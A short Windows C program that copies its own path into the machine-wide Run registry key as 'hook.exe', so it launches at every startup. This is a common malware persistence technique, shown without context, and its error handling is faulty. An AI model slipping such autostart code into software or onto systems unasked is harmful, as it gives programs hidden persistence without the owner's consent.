#include <windows.h>

int main()
{
HKEY hKey; 
char szPath[0x100]; 
GetModuleFileName(NULL, szPath, sizeof(szPath)); 
RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
                 "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 NULL, 
                 "", 
                 REG_OPTION_NON_VOLATILE, 
                 KEY_SET_VALUE, 
                 NULL, 
                 &hKey, 
                 NULL);

if (hKey) 
{ 
    RegSetValueEx(hKey, "hook.exe", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath)); 
    RegCloseKey(hKey); 
}
}